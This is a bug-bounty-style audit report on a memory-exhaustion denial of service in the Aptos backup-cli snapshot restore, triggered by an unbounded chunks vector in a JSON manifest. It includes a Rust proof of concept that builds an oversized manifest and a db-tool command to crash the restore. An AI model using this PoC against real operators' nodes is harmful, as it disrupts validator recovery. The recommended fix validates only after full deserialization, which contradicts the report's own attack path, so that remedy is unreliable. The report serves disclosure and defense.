# Audit Report

## Title
Unbounded Chunk Vector Deserialization Enables Memory Exhaustion DoS in State Snapshot Restore

## Summary
The state snapshot restoration process deserializes manifest files without validating the size of the `chunks` vector, allowing an attacker who controls a manifest file to cause memory exhaustion and crash the restore process by claiming billions of chunks in the JSON manifest.

## Finding Description

The `StateSnapshotBackup` struct contains a `chunks: Vec<StateSnapshotChunk>` field that is deserialized from untrusted JSON manifest files without any size validation. [1](#0-0) 

When an operator initiates a state snapshot restore operation using the `db-tool` or `backup-cli`, they provide a manifest file handle via the `--state-manifest` CLI parameter. [2](#0-1) 

The manifest is loaded and deserialized using `load_json_file`, which reads the entire file into memory and then deserializes it with `serde_json::from_slice`. [3](#0-2) 

The deserialization process occurs at the start of the restore operation, with no validation on the number of chunks before deserialization begins. [4](#0-3) 

**Attack Path:**
1. Attacker creates a malicious JSON manifest file with a `chunks` array containing billions of entries
2. Each `StateSnapshotChunk` entry contains minimal data (~100+ bytes with HashValues, FileHandles)
3. An operator is tricked into restoring from this manifest (via compromised backup storage or social engineering)
4. During `serde_json::from_slice` deserialization, the Vec grows to accommodate billions of chunks
5. Memory allocation eventually exceeds available RAM (e.g., 1 billion chunks × 100 bytes = ~100GB)
6. The process crashes due to allocator failure or OOM killer activation
7. This occurs before any validation logic executes (which only checks `chunks.len()` after deserialization)

The code accesses `manifest.chunks.len()` and processes chunks only after the manifest has been fully deserialized into memory, providing no protection against oversized vectors. [5](#0-4) 

**Invariant Violation:** This breaks the **Resource Limits** invariant (#9 in the specification), which states "All operations must respect gas, storage, and computational limits." The unbounded deserialization violates memory resource limits.

## Impact Explanation

This vulnerability achieves **Medium Severity** under the Aptos Bug Bounty program criteria:
- **Validator node slowdowns/crashes**: If the restore process is run on a validator node (common during bootstrap or recovery), the OOM crash can cause temporary node unavailability
- **State inconsistencies requiring intervention**: The crashed restore process leaves the database in an incomplete state, requiring manual intervention to clean up and restart with a valid backup

While this doesn't directly cause loss of funds or consensus violations, it can disrupt validator operations and potentially delay network recovery during disaster scenarios when restores are critical.

## Likelihood Explanation

**Likelihood: Medium**

The attack requires the attacker to control or influence the manifest file provided to the restore operation. This can occur through:
1. **Compromised backup storage**: If the backup storage (S3, GCS, local filesystem) is compromised, the attacker can replace legitimate manifests with malicious ones
2. **Social engineering**: An attacker could provide a "helpful" backup to an operator experiencing issues, containing the malicious manifest
3. **Supply chain attack**: If backup snapshots are shared between operators or from untrusted sources

Operators frequently restore from backups during:
- New node bootstrapping
- Disaster recovery scenarios
- Testing and development
- State verification operations

The attack requires no special privileges beyond the ability to influence which manifest file the operator uses.

## Recommendation

Implement a maximum chunk count validation before deserializing the manifest. Add a sanity check that validates the number of chunks against a reasonable upper bound based on the maximum state size.

**Recommended Fix:**

Add validation in `StateSnapshotRestoreController::run_impl` immediately after deserialization:

```rust
async fn run_impl(self) -> Result<()> {
    // ... existing code ...
    
    let manifest: StateSnapshotBackup =
        self.storage.load_json_file(&self.manifest_handle).await?;
    
    // SECURITY: Validate chunk count to prevent memory exhaustion attacks
    const MAX_REASONABLE_CHUNKS: usize = 1_000_000; // ~100GB state with 100KB chunks
    ensure!(
        manifest.chunks.len() <= MAX_REASONABLE_CHUNKS,
        "Manifest contains {} chunks, exceeding maximum of {}. This may indicate a corrupted or malicious manifest.",
        manifest.chunks.len(),
        MAX_REASONABLE_CHUNKS
    );
    
    // ... rest of the function ...
}
```

Alternatively, implement streaming deserialization with incremental validation, or add size limits to the `read_all` function in `storage_ext.rs`.

## Proof of Concept

**Creating a Malicious Manifest:**

```rust
// PoC: Generate a malicious manifest with excessive chunks
use aptos_backup_cli::backup_types::state_snapshot::manifest::{
    StateSnapshotBackup, StateSnapshotChunk
};
use aptos_crypto::HashValue;
use std::fs::File;
use std::io::Write;

fn create_malicious_manifest() -> anyhow::Result<()> {
    let mut manifest = StateSnapshotBackup {
        version: 1000000,
        epoch: 100,
        root_hash: HashValue::zero(),
        chunks: Vec::new(),
        proof: "proof_file".to_string(),
    };
    
    // Create 1 billion chunk entries (requires ~100GB RAM to deserialize)
    // In practice, even 10 million chunks (~1GB) would cause significant issues
    println!("Generating malicious manifest with 10 million chunks...");
    for i in 0..10_000_000 {
        manifest.chunks.push(StateSnapshotChunk {
            first_idx: i,
            last_idx: i,
            first_key: HashValue::zero(),
            last_key: HashValue::zero(),
            blobs: format!("blob_{}", i),
            proof: format!("proof_{}", i),
        });
    }
    
    let json = serde_json::to_string(&manifest)?;
    let mut file = File::create("malicious_manifest.json")?;
    file.write_all(json.as_bytes())?;
    
    println!("Malicious manifest created: {} bytes", json.len());
    println!("Expected memory consumption during deserialize: ~{}GB",
             manifest.chunks.len() * 100 / 1_000_000_000);
    Ok(())
}

// To trigger the vulnerability:
// 1. Run: cargo run -- oneoff state-snapshot \
//         --state-manifest malicious_manifest.json \
//         --state-into-version 1000000
// 2. Observe OOM crash during manifest deserialization
```

**Reproduction Steps:**
1. Create a malicious manifest JSON file with millions/billions of chunk entries
2. Run the db-tool with the malicious manifest: `aptos-db-tool oneoff state-snapshot --state-manifest malicious_manifest.json --state-into-version 1000000`
3. Monitor memory usage as `load_json_file` deserializes the manifest
4. Observe process crash due to memory exhaustion before any chunk processing begins

## Notes

The vulnerability exists in the backup/restore tooling, which is operator-facing infrastructure rather than consensus-critical code. However, these tools are essential for validator operations, disaster recovery, and node bootstrapping. A DoS attack on the restore process during a critical recovery scenario could significantly impact network availability and validator participation.

### Citations

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/manifest.rs (L29-51)
```rust
/// State snapshot backup manifest, representing a complete state view at specified version.
#[derive(Deserialize, Serialize)]
pub struct StateSnapshotBackup {
    /// Version at which this state snapshot is taken.
    pub version: Version,
    /// Epoch in which this state snapshot is taken.
    pub epoch: u64,
    /// Hash of the state tree root.
    pub root_hash: HashValue,
    /// All account blobs in chunks.
    pub chunks: Vec<StateSnapshotChunk>,
    /// BCS serialized
    /// `Tuple(TransactionInfoWithProof, LedgerInfoWithSignatures)`.
    ///   - The `TransactionInfoWithProof` is at `Version` above, and carries the same `root_hash`
    /// above; It proves that at specified version the root hash is as specified in a chain
    /// represented by the LedgerInfo below.
    ///   - The signatures on the `LedgerInfoWithSignatures` has a version greater than or equal to
    /// the version of this backup but is within the same epoch, so the signatures on it can be
    /// verified by the validator set in the same epoch, which can be provided by an
    /// `EpochStateBackup` recovered prior to this to the DB; Requiring it to be in the same epoch
    /// limits the requirement on such `EpochStateBackup` to no older than the same epoch.
    pub proof: FileHandle,
}
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L49-59)
```rust
#[derive(Parser)]
pub struct StateSnapshotRestoreOpt {
    #[clap(long = "state-manifest")]
    pub manifest_handle: FileHandle,
    #[clap(long = "state-into-version")]
    pub version: Version,
    #[clap(long)]
    pub validate_modules: bool,
    #[clap(long)]
    pub restore_mode: StateSnapshotRestoreMode,
}
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L123-124)
```rust
        let manifest: StateSnapshotBackup =
            self.storage.load_json_file(&self.manifest_handle).await?;
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L162-174)
```rust
        tgt_leaf_idx.set(manifest.chunks.last().map_or(0, |c| c.last_idx as i64));
        let total_chunks = manifest.chunks.len();

        let resume_point_opt = receiver.lock().as_mut().unwrap().previous_key_hash()?;
        let chunks = if let Some(resume_point) = resume_point_opt {
            manifest
                .chunks
                .into_iter()
                .skip_while(|chunk| chunk.last_key <= resume_point)
                .collect()
        } else {
            manifest.chunks
        };
```

**File:** storage/backup/backup-cli/src/utils/storage_ext.rs (L35-37)
```rust
    async fn load_json_file<T: DeserializeOwned>(&self, file_handle: &FileHandleRef) -> Result<T> {
        Ok(serde_json::from_slice(&self.read_all(file_handle).await?)?)
    }
```
